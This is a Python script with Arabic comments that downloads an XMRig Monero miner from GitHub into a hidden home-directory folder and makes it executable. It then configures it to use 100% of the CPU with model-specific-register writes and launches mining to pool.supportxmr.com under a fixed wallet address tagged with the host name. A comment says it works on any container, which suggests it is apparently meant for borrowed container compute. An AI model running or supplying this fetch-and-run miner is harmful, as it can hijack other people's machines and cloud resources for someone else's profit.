
import os
import subprocess
import urllib.request
import tarfile
import json
import psutil

# الرابط الجديد والأحدث (v6.24.0-mo1) - يعمل على كل الكونتينرات
url = "https://github.com/MoneroOcean/xmrig/releases/download/v6.24.0-mo1/xmrig-v6.24.0-mo1-lin64.tar.gz"

home_dir = os.path.expanduser("~")
xmrig_dir = os.path.join(home_dir, ".xmrig")
os.makedirs(xmrig_dir, exist_ok=True)

# تحميل النسخة القوية
tar_path = os.path.join(xmrig_dir, "xmrig-mo.tar.gz")
xmrig_exe = os.path.join(xmrig_dir, "xmrig")

if not os.path.exists(xmrig_exe):
    print("جاري تحميل النسخة القوية v6.24.0-mo1 (MoneroOcean + MSR patch)...")
    urllib.request.urlretrieve(url, tar_path)
    
    print("جاري فك الضغط...")
    with tarfile.open(tar_path, "r:gz") as tar:
        tar.extractall(path=xmrig_dir)
    os.remove(tar_path)
    
    # البحث عن ملف xmrig التنفيذي وجعله قابلاً للتشغيل
    for root, dirs, files in os.walk(xmrig_dir):
        if "xmrig" in files:
            xmrig_exe = os.path.join(root, "xmrig")
            os.chmod(xmrig_exe, 0o755)
            break
    
    print(f"تم التثبيت! XMRig في: {xmrig_exe}")

# إعدادات تجعل الـ CPU يشتغل 100% بدون أي تنازل
config = {
    "autosave": True,
    "background": False,
    "colors": False,
    "donate-level": 0,
    "cpu": {
        "enabled": True,
        "huge-pages": True,
        "huge-pages-jit": True,
        "hw-aes": True,
        "priority": 5,
        "yield": False,
        "max-threads-hint": 100,
        "rdmsr": True,
        "wrmsr": True,
        "randomx": {
            "init": -1,
            "mode": "fast",
            "1gb-pages": True,
            "numa": True
        }
    },
    "pools": [{
        "algo": "rx/0",
        "url": "pool.supportxmr.com:7777",
        "user": "89cPJqfcFTHchVthB5mraBN7AgmLJh7C4EHdD35vbgVj4sT4dtvNiQuGjuh4FZ6fcUcwCPPqKD5hg9wcnUvdM7ACRhRxd8e." + os.uname().nodename,
        "pass": "x",
        "keepalive": True,
        "tls": False
    }]
}

config_path = os.path.join(xmrig_dir, "config.json")
with open(config_path, "w") as f:
    json.dump(config, f, indent=4)

# تشغيل بكامل القوة
cmd = [
    xmrig_exe,
    "--config=" + config_path,
    "--cpu-max-threads-hint=100",
    "--no-color",
    "--randomx-1gb-pages",
    "--randomx-mode=fast"
]

print("تشغيل النسخة القوية بكامل الطاقة (ستشوف 20-28kH/s خلال دقايق)...")
print("اضغط Ctrl+C للإيقاف.")

process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1, universal_newlines=True)

try:
    for line in process.stdout:
        print(line, end='')
except KeyboardInterrupt:
    print("\nتم إيقاف التعدين")
    process.terminate()
